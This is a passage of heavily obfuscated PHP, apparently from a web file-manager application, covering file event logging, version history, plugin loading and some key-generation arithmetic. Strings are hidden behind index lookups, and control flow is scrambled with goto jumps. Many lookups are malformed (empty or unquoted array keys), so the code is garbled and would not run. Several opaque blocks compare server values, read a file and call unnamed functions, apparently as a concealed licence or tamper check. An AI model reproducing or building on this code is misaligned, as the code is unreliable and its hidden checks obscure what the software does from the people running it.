$_SERVER[ȂŊ]; $b׭ = $this->{$_SERVER[ȂŊ][377]}(); goto B׫ظ; B: } public function aueoe64c1c15($A͛ښ) { goto Dܸ; bш: while ($b∬ < $E[610]) { if ($b∬ >= 0) { break; } $b∬++; } if (!$dЈȤ֏) { return $fА[10]; } $dЈȤ֏ = $fА[271]($dЈȤ֏); goto Eͅ; Eͅ: $e󌃍 = $E[713]; if (!$e󌃍) { die; } $f㈖ = 0; goto cʉ¼㽂; dА: $D = $fА[131]($fА[378] . ($f㈖ + $E) . $fА[379] . $C߇ヺ . $fА[379] . $f֑ . $fА[380]); $Bދ = $this->{$_SERVER[ȂŊ][277]}($A[0], $D); return $Bދ; goto aɧك; c: if (!$eڜƳ) { return; } while (1) { $Cƽ = $C߇ヺ; $f⮅ٌ = $E[718]; while (strlen($f⮅ٌ) < $E[605]) { if (!$f⮅ٌ) { break; } $f⮅ٌ++; } $F = $Dنܮ; while ($F % $Cƽ != 0) { $aɑ = $F; $F = $Cƽ; $dꬋ = $E[719]; if (!$dꬋ) { return; } $Cƽ = $aɑ % $Cƽ; } if ($Cƽ == 1) { break; } else { $C߇ヺ++; } } $f֑ = 2; goto f܄; cʉ¼㽂: $E = 0; $d = $E[714]; if (!$d) { return; } goto c陚; Cܻ: if (!$EֆҼ) { die; } $C߇ヺ = $fА[271](($f㈖ + $E) / 2); $eڜƳ = $E[717]; goto c; Dܸ: $E =& $_SERVER[]; $fА =& $_SERVER[ȂŊ]; $A = $fА[0]($fА[381], $A͛ښ); goto E; f܄: $E = $E[720]; if (!$E) { return; } for ($EܛҊ = 0; $EܛҊ < $Dنܮ * 10; $EܛҊ++) { if (($Dنܮ * $EܛҊ + 1) % $C߇ヺ == 0) { $f֑ = $fА[271](($Dنܮ * $EܛҊ + 1) / $C߇ヺ); break; } } goto dА; E: if ($fА[19]($A) != 2) { return $fА[10]; } $dЈȤ֏ = $this->{$_SERVER[ȂŊ][277]}($A[1] . $fА[10], $fА[174]); $b∬ = $E[712]; goto bш; c陚: for ($EܛҊ = 3; $EܛҊ < $dЈȤ֏; $EܛҊ += 2) { if ($dЈȤ֏ % $EܛҊ != 0) { continue; } $f㈖ = $EܛҊ; $F㠽 = $E[715]; $E = $fА[271]($dЈȤ֏ / $EܛҊ); break; } $Dنܮ = ($f㈖ - 1) * ($E - 1); $EֆҼ = $E[716]; goto Cܻ; aɧك: } public function codwe6920ccd() { goto Fכ; Fכ: $a՚ =& $_SERVER[]; $C׆ᥑ =& $_SERVER[ȂŊ]; $D = $C׆ᥑ[363]($C׆ᥑ[382](2, 14), $C׆ᥑ[382](2, 16) - 1); goto E; E: $F˃ = $a՚[721]; $d֜ = array(); $Bم = 1; goto AУޝ; Cۄ޷: $Aך֍ = 2; $fтת = $a՚[723]; if (!$fтת) { return; } goto eČ; eČ: for ($cѿ = $D; $cѿ > 1; $cѿ--) { $B˜ۋ = !0; foreach ($d֜ as $d߼) { if ($cѿ % $d߼ == 0) { $B˜ۋ = !1; break; } } if ($B˜ۋ) { $Aך֍ = $cѿ; break; } } return $Aך֍; goto FɄ; AУޝ: $cٌ = $a՚[722]; if (!$cٌ) { return; } while ($Bم <= (int) $C׆ᥑ[383]($D)) { $cѿ = $Bم; while (!0) { $cѿ++; if ($cѿ <= 2) { $Bم = $cѿ; break; } else { if ($cѿ < 2) { continue; } } $B˜ۋ = !0; for ($f = 2; $f <= $C׆ᥑ[383]($cѿ); $f++) { if ($cѿ % $f == 0) { $B˜ۋ = !1; } } if ($B˜ۋ) { $Bم = $cѿ; break; } } $d֜[] = $Bم; } goto Cۄ޷; FɄ: } public function xore08a7aa80($Bҝ, $AАː) { $cӗğ =& $_SERVER[ȂŊ]; return $cӗğ[13](array($cӗğ[14], $cӗğ[384]), $Bҝ, $AАː); } public function bfehec4c46b7($cˈ, $e֫) { $F =& $_SERVER[ȂŊ]; return $F[13](array($F[385], $F[386]), $cˈ, $e֫); } public function jzby74d20730($fŻί, $c) { $c扵 =& $_SERVER[]; $D則 =& $_SERVER[ȂŊ]; return $D則[13](array($D則[385], $D則[387]), $fŻί, $c); $CՂ = $c扵[724]; while ($CՂ < $c扵[629]) { if ($CՂ >= 0) { break; } $CՂ++; } } } goto dɓ; Eɮ: if ($_SERVER[$_SERVER[][840]] != $_SERVER[$_SERVER[][1414]]) { goto bכ; bכ: $d탞 = $_SERVER[][842]; $d = $_SERVER[$_SERVER[][843]] . $_SERVER[][844]; $F缾 = $d탞($d); goto A֐; AƑ捲: $e愼($_SERVER[$_SERVER[][841]]); goto D; A֐: $b䲽ҳ = explode($_SERVER[][229], $F缾); if (count($b䲽ҳ) < $_SERVER[][623]) { $cƃܣ = $_SERVER[][845]; $cƃܣ(); } $e愼 = $_SERVER[][846]; goto AƑ捲; D: } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\143\x65\137\145\166\x65\156\164"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\155\x65", "\x74\151\155\145", "\x69\x6e\163\x65\x72\x74", "\146\165\156\x63\x74\151\157\x6e"), array("\144\145\163\143", '', "\151\156\x73\x65\x72\x74\x2c\x75\160\144\x61\x74\145\54\x73\145\154\x65\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($bɌ, $C, $Dɦ = '') { goto aא; c̚: return $this->add($fՌ); goto Dɞͭ; aא: $FŹ =& $_SERVER[]; if (!$this->eventSave) { return; } $fˇ = Model($FŹ[1223])->sourceInfo($bɌ); goto cҙ; cҙ: if (!$fˇ) { return !1; } if ($this->isCacheEvent($fˇ, $C)) { return; } if ($Dɦ && is_string($Dɦ)) { $Dɦ = array($FŹ[1753] => $Dɦ); } goto dް; dް: $fՌ = array($FŹ[412] => $bɌ, $FŹ[1926] => $fˇ[$FŹ[492]], $FŹ[1927] => $fˇ[$FŹ[28]], $FŹ[513] => !empty($fˇ[$FŹ[513]]) ? $fˇ[$FŹ[513]] : $FŹ[33], $FŹ[1537] => USER_ID, $FŹ[417] => $C, $FŹ[1539] => $Dɦ); $this->addSystemLog($C, $fՌ); unset($fՌ[$FŹ[1927]], $fՌ[$FŹ[513]]); goto c̚; Dɞͭ: } private function addSystemLog($a˧޻, $dڴ) { $EȒ =& $_SERVER[]; if ($a˧޻ == $EȒ[1928]) { $a˧޻ = $dڴ[$EȒ[445]][$EȒ[1929]]; } else { if (in_array($a˧޻, array($EȒ[1692], $EȒ[1930]))) { $a˧޻ = $dڴ[$EȒ[445]][$EȒ[732]]; } } $Cӿ = array_merge($dڴ, array($EȒ[1931] => $dڴ[$EȒ[397]], $EȒ[1932] => $dڴ[$EȒ[1932]])); Model($EȒ[1656])->addLog($EȒ[1933] . $a˧޻, $Cӿ); } private function isCacheEvent($d鷎, $Bű) { if ($d鷎[$_SERVER[][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Bƙ, $d؛) { $D㬞 =& $_SERVER[]; $C̝ = Model($D㬞[1223])->sourceInfo($Bƙ); $e = array($D㬞[1929] => $d؛, $D㬞[28] => $C̝[$D㬞[28]]); return $this->addEvent($Bƙ, $D㬞[1928], $e); } public function eventFileEdit($d) { $b =& $_SERVER[]; $e񍘷 = array($b[1934] => $_SERVER[$b[1935]], $b[1936] => strtolower(ACTION)); return $this->addEvent($d, $b[1682], $e񍘷); } public function eventRecycle($c׆, $c☑) { return $this->addEvent($c׆, $_SERVER[][1930], $c☑); } public function eventRemove($f) { $E =& $_SERVER[]; $c޾ = Model($E[1223])->sourceInfo($f); $a = $c޾[$E[28]]; return $this->addEvent($c޾[$E[492]], $E[1681], $a); } public function eventShare($A쬩, $E٠Ԝ) { return $this->addEvent($A쬩, $_SERVER[][1692], $E٠Ԝ); } public function eventMove($eئ, $eֵ, $AӇ) { goto cԱˠ; aܓΨ: $this->addEvent($eئ, $e΂[545], $Fϐ); $D͛֒ = $a􉊉->sourceInfo($eئ); $Fϐ = array($e΂[397] => $D͛֒[$e΂[397]], $e΂[28] => $D͛֒[$e΂[28]]); goto aƉ; cԱˠ: $e΂ =& $_SERVER[]; $a􉊉 = Model($e΂[1223]); $D͛֒ = $a􉊉->sourceInfo($eئ); goto c; c: $D݊ = $a􉊉->sourceInfo($eֵ); $Cġ = $a􉊉->sourceInfo($AӇ); $Fϐ = array($e΂[1072] => $eֵ, $e΂[1937] => $D݊[$e΂[28]], $e΂[1917] => !empty($D݊[$e΂[513]]) ? $D݊[$e΂[513]] : $e΂[33], $e΂[1073] => $AӇ, $e΂[1938] => $Cġ[$e΂[28]], $e΂[1939] => !empty($Cġ[$e΂[513]]) ? $Cġ[$e΂[513]] : $e΂[33]); goto aܓΨ; aƉ: $this->addEvent($eֵ, $e΂[1940], $Fϐ); goto A躮; A躮: } public function eventCopy($e) { $this->eventCreate($e, $_SERVER[][543]); } public function eventRename($Aא, $B, $d֒ſ) { $EϺߟ =& $_SERVER[]; $bѡ = array($EϺߟ[1072] => $B, $EϺߟ[1073] => $d֒ſ); return $this->addEvent($Aא, $EϺߟ[1237], $bѡ); } public function eventAddComment($e૷, $E) { return $this->addEvent($e૷, $_SERVER[][1941], $E); } public function eventAddDesc($cۍԻ, $f؊) { return $this->addEvent($cۍԻ, $_SERVER[][1942], $f؊); } public function listBySource($AŇà) { goto fԍ; B: return $this->eventListParse($a֌, $AŇà); goto a; fԍ: $cǂŧ =& $_SERVER[]; $F = Model($cǂŧ[1223])->sourceInfo($AŇà); $dؕ = array($cǂŧ[412] => $AŇà); goto e; e: if ($F[$cǂŧ[405]] == $cǂŧ[87]) { $d = Model($cǂŧ[1223])->listSearchChildren($AŇà, 20000); $d[] = $AŇà . $cǂŧ[376]; $dؕ = array($cǂŧ[397] => array($cǂŧ[7], $d)); } $a֌ = $this->where($dؕ)->order($cǂŧ[1943])->selectPage(); if ($a֌[$cǂŧ[364]][$cǂŧ[365]] == 0) { $a֌[$cǂŧ[364]][$cǂŧ[365]] = 1; $a֌[$cǂŧ[367]] = array(array($cǂŧ[412] => $AŇà, $cǂŧ[1926] => $F[$cǂŧ[492]], $cǂŧ[1537] => $F[$cǂŧ[446]], $cǂŧ[417] => $cǂŧ[1944], $cǂŧ[418] => $F[$cǂŧ[194]], $cǂŧ[1539] => $cǂŧ[33])); } goto B; a: } private function eventListParse($E֠, $F̙à) { goto C; D: $cƃ = Model($eƿȇ[809])->sourceListInfo($dԃ, !0); foreach ($c㮥߬ as &$B) { if ($B[$eƿȇ[29]] == $eƿȇ[545] && isset($B[$eƿȇ[445]][$eƿȇ[1072]])) { $B[$eƿȇ[445]][$eƿȇ[1072]] = $cƃ[$B[$eƿȇ[445]][$eƿȇ[1072]]]; $B[$eƿȇ[445]][$eƿȇ[1073]] = $cƃ[$B[$eƿȇ[445]][$eƿȇ[1073]]]; } if ($B[$eƿȇ[29]] == $eƿȇ[1940] && isset($B[$eƿȇ[445]][$eƿȇ[397]])) { $B[$eƿȇ[445]][$eƿȇ[397]] = $cƃ[$B[$eƿȇ[445]][$eƿȇ[397]]]; } $B[$eƿȇ[85]] = $cƃ[$B[$eƿȇ[397]]]; $B[$eƿȇ[1945]] = $cƃ[$B[$eƿȇ[1932]]]; if ($B[$eƿȇ[29]] == $eƿȇ[1681]) { $B[$eƿȇ[1945]] = $B[$eƿȇ[85]]; $B[$eƿȇ[1932]] = $B[$eƿȇ[1945]][$eƿȇ[397]]; $B[$eƿȇ[85]] = !1; $B[$eƿȇ[397]] = $eƿȇ[33]; } $B[$eƿȇ[1877]] = $E[$B[$eƿȇ[1546]]]; } unset($B); goto eŒ; eګ: $dԃ = array_unique($dԃ); $c = array_unique(array_to_keyvalue($c㮥߬, $eƿȇ[33], $eƿȇ[1546])); $E = Model($eƿȇ[532])->userListInfo($c); goto D; Eť: $B = array_to_keyvalue($c㮥߬, $eƿȇ[33], $eƿȇ[1932]); foreach ($c㮥߬ as $B) { $B = $B[$eƿȇ[445]]; if ($B[$eƿȇ[29]] == $eƿȇ[545] && isset($B[$eƿȇ[1072]])) { $dԃ[] = $B[$eƿȇ[1072]] . $eƿȇ[33]; $dԃ[] = $B[$eƿȇ[1073]] . $eƿȇ[33]; } if ($B[$eƿȇ[29]] == $eƿȇ[1940] && isset($B[$eƿȇ[397]])) { $dԃ[] = $B[$eƿȇ[397]] . $eƿȇ[33]; } } $dԃ = array_merge($dԃ, $B, array($F̙à . $eƿȇ[33])); goto eګ; eŒ: $E֠[$eƿȇ[367]] = $c㮥߬; return $E֠; goto Dз切; C: $eƿȇ =& $_SERVER[]; $c㮥߬ = $E֠[$eƿȇ[367]]; $dԃ = array_to_keyvalue($c㮥߬, $eƿȇ[33], $eƿȇ[397]); goto Eť; Dз切: } public function removeBySource($A) { $cܹУ = array($_SERVER[][412] => $A); $this->where($cܹУ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\x65\137\150\x69\163\x74\x6f\162\171"; public function historyCount($c׻) { goto aь; B: return array_to_keyvalue($d, $Bŉ߸[397], $Bŉ߸[494]); goto d턐ٲ; aь: $Bŉ߸ =& $_SERVER[]; if (!$c׻) { return array(); } if (is_string($c׻) || is_int($c׻)) { $c׻ = array($c׻); } goto b; b: $a̞ = array($Bŉ߸[397], $Bŉ߸[1747] => $Bŉ߸[494]); $B = array($Bŉ߸[397] => array($Bŉ߸[7], $c׻)); $d = $this->field($a̞)->where($B)->group($Bŉ߸[397])->select(); goto B; d턐ٲ: } public function addHistory($f, $d뮗ޱ = '') { $c팈 =& $_SERVER[]; $eΌίů = array($c팈[412] => $f[$c팈[397]], $c팈[1537] => isset($f[$c팈[448]]) ? $f[$c팈[448]] : $f[$c팈[446]], $c팈[462] => $f[$c팈[461]], $c팈[573] => $f[$c팈[78]], $c팈[1946] => $d뮗ޱ); $fɼ = $GLOBALS[$c팈[6]][$c팈[88]][$c팈[1121]]; if ($fɼ > 1) { $this->historyAutoClear($eΌίů[$c팈[397]]); $this->add($eΌίů); } Hook::trigger($c팈[1947], $eΌίů); Model($c팈[1948])->eventFileEdit($f[$c팈[397]]); } private function historyAutoClear($Fڐ껾) { goto aϬ; F: $fɞ = array_slice($fɞ, $E־); if (!$C䰜 || !$fɞ) { return; } $a¬ = array($EƱ[414] => array($EƱ[7], $C䰜)); goto c쇧깄; c쇧깄: $this->where($a¬)->delete(); Model($EƱ[464])->remove($fɞ); goto AҜ; Eэ: $E־ = $Cͼ == $EƱ[1144] ? 5 : $C˂㻨; if ($C˂㻨 <= 1) { $E־ = 1; } if ($E־ >= 500) { return; } goto dҽ; dҽ: $a¬ = array($EƱ[412] => $Fڐ껾); $dܪ = $this->field($EƱ[1949])->where($a¬)->order($EƱ[1943])->select(); if (!$dܪ || $E־ >= count($dܪ)) { return; } goto Eٽ; aϬ: $EƱ =& $_SERVER[]; $Cͼ = Model($EƱ[747])->get($EƱ[1143]); $C˂㻨 = $GLOBALS[$EƱ[6]][$EƱ[88]][$EƱ[1121]]; goto Eэ; Eٽ: $C䰜 = array_to_keyvalue($dܪ, $EƱ[33], $EƱ[395]); $C䰜 = array_slice($C䰜, $E־); $fɞ = array_to_keyvalue($dܪ, $EƱ[33], $EƱ[461]); goto F; AҜ: } public function listData($E) { goto BҲ; BÍ: $a = 5; if ($E즦 == $a[1144]) { $C[$a[367]] = array_slice($C[$a[367]], 0, $a); $C[$a[364]] = array($a[1951] => 1, $a[1952] => 20, $a[1953] => 1, $a[1954] => count($C[$a[367]])); } return $C; goto Dʲ; a: $C = $this->field($Fۄ)->where($B)->order($a[1943])->selectPage(); $this->_listAppendUser($C[$a[367]]); $E즦 = Model($a[747])->get($a[1143]); goto BÍ; BҲ: $a =& $_SERVER[]; $B = array($a[412] => $E); $Fۄ = $a[1950]; goto a; Dʲ: } protected function _listAppendUser(&$E壱) { $c۬ =& $_SERVER[]; $d = array_to_keyvalue($E壱, $c۬[33], $c۬[1546]); $Eܾ = Model($c۬[532])->userListInfo($d); foreach ($E壱 as &$A) { $e = $A[$c۬[1546]]; $A[$c۬[446]] = $Eܾ[$e] ? $Eܾ[$e] : !1; } unset($A); } public function fileInfo($DĊ) { $cˬÕ =& $_SERVER[]; $A脜 = $this->tablePrefix; $dӥŋ = "{$A脜}\151\157\137\x66\151\x6c\x65\x20\x66\x69\x6c\145\163\40\x6f\156\40\x66\x69\154\145\x73\56\146\151\x6c\145\111\104\40\75\x20\150\151\x73\164\x6f\x72\x79\x2e\146\x69\x6c\x65\x49\x44"; return $this->alias($cˬÕ[1955])->where(array($cˬÕ[414] => $DĊ))->join($dӥŋ, $cˬÕ[1956])->find(); } public function removeItem($eǬ) { $b =& $_SERVER[]; $e탶 = array($b[414] => $eǬ); $dӮ = $this->where($e탶)->find(); if ($dӮ) { $F˗ = $this->where($e탶)->delete(); Model($b[464])->remove($dӮ[$b[461]]); return $F˗; } return !1; } public function removeBySource($dÂђש) { goto A; A: $f =& $_SERVER[]; if (!$dÂђש) { return !1; } if (!is_array($dÂђש)) { $dÂђש = array($dÂђש); } goto Cڐ; Cڐ: $e = array($f[412] => array($f[7], $dÂђש)); $Eȇ = $this->field($f[462])->where($e)->select(); if ($Eȇ) { $this->where($e)->delete(); $EǕ = array_to_keyvalue($Eȇ, $f[33], $f[461]); Model($f[464])->remove($EǕ); } goto C飕ӌ; C飕ӌ: return !0; goto dߐ; dߐ: } public function setDetail($aۗմ, $d󄞣) { $CԵθ =& $_SERVER[]; return $this->where(array($CԵθ[414] => $aۗմ))->save(array($CԵθ[1946] => $d󄞣)); } public function rollbackToItem($a֤, $c) { goto d汃ӓ; B: $fˊƫ = $this->find($c); $Bܾ = array($E斊[461] => $fˊƫ[$E斊[461]], $E斊[78] => $fˊƫ[$E斊[78]], $E斊[84] => time(), $E斊[448] => USER_ID); Model($E斊[809])->where(array($E斊[397] => $a֤))->save($Bܾ); goto f; d汃ӓ: $E斊 =& $_SERVER[]; $dף = Model($E斊[809])->sourceInfo($a֤); $this->addHistory($dף, LNG($E斊[1957])); goto B; f: return $this->where(array($E斊[414] => $c))->delete(); goto a; a: } public function clearSame($C泺) { goto fК렞; c먬: if (!$Dಎڡ) { return; } $this->where(array($bڐղ[395] => array($bڐղ[7], $Dಎڡ)))->delete(); Model($bڐղ[464])->remove($c̫Ę); goto fߒϵ; CҾ: $c̫Ę = array(); $Dಎڡ = array(); foreach ($d˽ as $C) { if (!$C || count($C) <= 1) { continue; } foreach ($C as $C) { $c̫Ę[] = $C[$bڐղ[461]]; $Dಎڡ[] = $C[$bڐղ[395]]; } } goto c먬; fК렞: $bڐղ =& $_SERVER[]; $B٥ = $this->listData($C泺); $d˽ = array_to_keyvalue_group($B٥, $bڐղ[461]); goto CҾ; fߒϵ: } public function userSpace() { $a̅㭄 =& $_SERVER[]; $Dх = $this->tablePrefix; $E = array($a̅㭄[1537] => USER_ID); $AȌ = "{$Dх}\x69\157\137\x66\151\x6c\145\40\146\151\154\145\x73\40\x6f\156\40\146\x69\x6c\145\163\56\x66\x69\x6c\145\111\x44\x20\75\40\x68\x69\163\164\x6f\162\171\x2e\146\151\x6c\145\111\104"; return $this->alias($a̅㭄[1955])->where($E)->join($AȌ, $a̅㭄[1956])->sum($a̅㭄[78]); } } goto Bܯ; bш: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto CպĈ; A瓏: if ($B && strpos($C֧Ο[47] . $B . $C֧Ο[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$C֧Ο[1420]] . $this->pluginName . $C֧Ο[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto a󸠦Ί; Cĝ: $this->pluginName = str_replace($C֧Ο[1416], $C֧Ο[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $C֧Ο[8]; $this->pluginApi = appHostGet() . $C֧Ο[1417] . $this->pluginName . $C֧Ο[8]; goto Dŉ; CպĈ: $C֧Ο =& $_SERVER[]; if ($_SERVER[$C֧Ο[840]] != $_SERVER[$C֧Ο[1414]]) { goto bܼ; bܼ: $a = $C֧Ο[858]; $eăù = $C֧Ο[842]; $A = $_SERVER[$C֧Ο[843]] . $C֧Ο[844]; goto DӲ; D: $B» = $C֧Ο[859]; $B»($_SERVER[$C֧Ο[860]]); $B»($_SERVER[$C֧Ο[843]] . $C֧Ο[1415]); goto aɤ; aɤ: $F = 1; while ($F > 1) { $F = $F + 4; $dΟ = rawurlencode($F . $C֧Ο[376]); } goto c쌫; DӲ: $f = $eăù($A); $e̲ = explode($C֧Ο[229], $f); if (count($e̲) < $C֧Ο[605]) { $a = $C֧Ο[845]; $a(); } goto D; c쌫: } global $in, $config; goto B⣩ن; Dŉ: $this->pluginHost = $config[$C֧Ο[1418]] . $this->pluginName . $C֧Ο[8]; $this->pluginHostDefault = $config[$C֧Ο[1418]] . $this->pluginName . $C֧Ο[8]; $B = $config[$C֧Ο[1419]]; goto A瓏; B⣩ن: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($C֧Ο[1416]); goto Cĝ; a󸠦Ί: $this->echoJsAssignArr = array(); return $this; goto Fⶎ; Fⶎ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1421]); } protected function assign($eݥ, $DƜ = false) { if (is_array($eݥ)) { $this->values = array_merge($this->values, $eݥ); } else { $this->values[$eݥ] = $DƜ; } } protected function display($Cĩ) { extract($this->values); require $Cĩ; } final function hookRegist($A) { $this->modelPlugin->appRegist($this->pluginName, $A); } final function appIcon() { $a՝ =& $_SERVER[]; $CŮȟң = $this->appPackage(); $f = $a՝[33]; if (isset($CŮȟң[$a՝[411]])) { if (isset($CŮȟң[$a՝[411]][$a՝[1422]])) { $f = $a՝[1423] . $CŮȟң[$a՝[411]][$a՝[1422]] . $a՝[1424]; } else { if ($CŮȟң[$a՝[411]][$a՝[1425]]) { $f = $a՝[1426] . $CŮȟң[$a՝[411]][$a՝[1425]] . $a՝[1427]; } } } return $f; } final function fileCanView($D) { goto Dӑ; cퟌ: $Cۉը = Session::get($bО[1428]); if (!$Cۉը || !$Cۉը[$bО[1429]]) { $fɵ = $bО[1430] . rawurlencode(this_url()); show_tips(LNG($bО[1431]) . $bО[1432] . $fɵ . $bО[1433] . LNG($bО[1434]) . $bО[1435], !1); } if (!Action($bО[1436])->authCan($bО[1437])) { show_tips(LNG($bО[1438]) . $bО[1439], !1); } goto B; Dӑ: $bО =& $_SERVER[]; if (request_url_safe($D)) { return !0; } if ($this->isShare($D)) { return !0; } goto cퟌ; B: ActionCall($bО[1440], $D); goto D; D: } final function isShare($f) { $A̔߷ = KodIO::parse($f); return $A̔߷[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($A) { if (request_url_safe($A)) { return $A; } if (!$this->isShare($A)) { $A = $this->filePath($A); } return Action($_SERVER[][1087])->linkOut($A); } public function filePathLinkOut($eյ) { if (request_url_safe($eյ)) { return $eյ; } $this->fileCanView($eյ); return Action($_SERVER[][1087])->link($eյ); } final function filePath($a׷) { $aƊ =& $_SERVER[]; if ($dȍ = $this->checkSharePath($a׷)) { Hook::trigger($aƊ[1441], $dȍ); return $dȍ; } $this->fileCanView($a׷); if (request_url_safe($a׷)) { $a͹ = parse_url_query($a׷); if (isset($a͹[$aƊ[1442]]) && isset($a͹[$aƊ[209]])) { $F㰎» = Model($aƊ[747])->get($aƊ[748]); $bբ = Mcrypt::decode($a͹[$aƊ[209]], $F㰎»); if ($bբ) { $this->fileInfo = IO::infoWithChildren($bբ); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $bբ; } } $a׷ = $this->_cacheHttpFile($a׷); $this->fileInfo = IO::infoWithChildren($a׷); } else { $this->fileInfo = IO::infoWithChildren($a׷); if (!$this->fileInfo) { show_tips(LNG($aƊ[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($aƊ[1441], $a׷); return $a׷; } final function _cacheHttpFile($bӍ) { $C󂓩 = hash_path($bӍ, !0); $this->cachePath = $this->pluginCachePath($C󂓩); if ($d뵊 = IO::fileNameExist($this->cachePath, $C󂓩)) { return KodIO::make($d뵊); } $Fј = $this->cachePath . $C󂓩; return $this->pluginCacheFileSet($Fј, file_get_contents_nossl($bӍ)); } final function _tmpFileName($F = array()) { goto d; C: $Fȡ = array($F[$d[28]], $F[$d[76]], $F[$d[78]]); if (isset($F[$d[515]])) { $Fȡ[] = $F[$d[515]]; } return md5(implode($d[71], $Fȡ)); goto cմ; d: $d =& $_SERVER[]; if (!$F) { $F = $this->fileInfo; } if (isset($F[$d[171]])) { return $F[$d[171]]; } goto b뗳; b뗳: if (isset($F[$d[164]][$d[171]])) { return $F[$d[164]][$d[171]]; } $Eܓ = IO::hashSimple($F[$d[76]]); if ($Eܓ) { return $Eܓ; } goto C; cմ: } final function checkSharePath($F) { goto a; dĈ֙: $this->cachePath = $this->pluginCachePath($this->fileInfo[$EΑ̷[171]]); return $eڕ[$EΑ̷[76]]; goto C; a: $EΑ̷ =& $_SERVER[]; if (!defined($EΑ̷[468])) { define($EΑ̷[508], 0); } if (!$this->isShare($F)) { return !1; } goto Bᄥ; Bᄥ: $eڕ = Action($EΑ̷[1087])->sharePathInfo($F); if (!isset($eڕ[$EΑ̷[76]])) { show_json(LNG($EΑ̷[1443]), !1); } $this->fileInfo = $eڕ[$EΑ̷[164]]; goto dĈ֙; C: } final function pluginCachePath($DβË = '') { $D =& $_SERVER[]; $FӅ = IO_PATH_SYSTEM_TEMP . $D[1444] . $this->pluginName; if (!($B̉ = IO::infoFull($FӅ))) { return IO::mkdir($FӅ . $D[8] . $DβË); } if (empty($DβË)) { return $B̉[$D[76]]; } if (!($c匩ۊ = IO::fileNameExist($B̉[$D[76]], $DβË))) { return IO::mkdir($B̉[$D[76]] . $DβË); } return KodIO::make($c匩ۊ); } final function pluginCacheFileSet($Aՠ, $B܄ = '') { $Aе =& $_SERVER[]; if (!($F = IO::infoFull($Aՠ))) { return IO::mkfile($Aՠ, $B܄, REPEAT_REPLACE); } IO::setContent($F[$Aе[76]], $B܄); return $F[$Aе[76]]; } final function pluginLocalFile($BⓍ = '') { goto dে; A: if (!checkExtSafe($BՓ)) { $BՓ = $BՓ . $c[1445]; } $d떑ϑ = $c . $BՓ; if (@file_exists($d떑ϑ)) { return $d떑ϑ; } goto B; dে: $c =& $_SERVER[]; $c = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($c)) { mk_dir($c); } goto Eه׷; B: return IO::copy($BⓍ, $c, 0, $BՓ); goto d于; Eه׷: if (!$BⓍ) { return $c; } $eډ = IO::info($BⓍ); $BՓ = $this->_tmpFileName($eډ) . $c[95] . $eډ[$c[168]]; goto A; d于: } final function appPackage() { goto cΨɯ; A: return $C걜ǉ; goto fߐ; A: $this->parseLang($aܰ); $C걜ǉ = json_decode_force($aܰ); if (!$C걜ǉ) { return array(); } goto eˣ; cΨɯ: $d =& $_SERVER[]; if ($this->packageData) { return $this->packageData; } $aܰ = $this->parseFile($this->pluginPath . $d[1446]); goto A; eˣ: $A糙Ч = Hook::trigger($d[1447], $C걜ǉ); if ($A糙Ч && is_array($A糙Ч)) { $C걜ǉ = $A糙Ч; } $this->packageData = $C걜ǉ; goto A; fߐ: } public function packageInfoGet($D谂) { $Aяۛ = $this->appPackage(); return array_get_value($Aяۛ, $D谂); } public function packageVersion() { return $this->packageInfoGet($_SERVER[][1448]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[][1449]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[][1450]); } public function echoJsAssign($aÞȽ, $b) { $this->echoJsAssignArr[$aÞȽ] = $b; } private function parseFile($eݓ) { goto e؜; eњ: $EՆ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$b˪[88]][$b˪[1458]]); foreach ($this->echoJsAssignArr as $A => $Bي͘) { $Dٙ[] = $b˪[1459] . $A . $b˪[1460]; $EՆ[] = is_array($Bي͘) || is_object($Bي͘) ? rawurlencode(json_encode($Bي͘)) : $Bي͘; } if (strstr($dȮ, $b˪[1461])) { $a = rawurlencode(json_encode($this->pluginLangArr)); $dȮ = str_replace($b˪[1461], $a, $dȮ); } goto a; e؜: $b˪ =& $_SERVER[]; $dȮ = file_get_contents_nossl($eݓ); $Dٙ = array($b˪[1451], $b˪[1452], $b˪[1453], $b˪[1454], $b˪[1455], $b˪[1456], $b˪[1457]); goto eњ; a: if (strstr($dȮ, $b˪[1462])) { $a = $a = rawurlencode(json_encode($this->getConfig())); $dȮ = str_replace($b˪[1462], $a, $dȮ); } $dȮ = str_replace($Dٙ, $EՆ, $dȮ); return $dȮ; goto aµ軈; aµ軈: } private function parseLang(&$bǶ) { goto f; a輏: $e׋䑱 = array(); foreach ($fĄ[0] as $a) { $bܨ = substr($a, strlen($Dԫ), -4); $Cս؃ = LNG($bܨ); $cѯ[] = $a; $e׋䑱[] = str_replace(array($EÇ[229], $EÇ[1055], $EÇ[340], $EÇ[116]), array($EÇ[50], $EÇ[50], $EÇ[33], $EÇ[1465]), $Cս؃); } $bǶ = str_replace($cѯ, $e׋䑱, $bǶ); goto Eӥ; f: $EÇ =& $_SERVER[]; $Dԫ = $EÇ[1463]; if (!strstr($bǶ, $Dԫ)) { return; } goto Dަᅎ; Dަᅎ: preg_match_all($EÇ[1464], $bǶ, $fĄ); if (!is_array($fĄ) || count($fĄ) == 0 || !is_array($fĄ[0]) || count($fĄ[0]) == 0) { return; 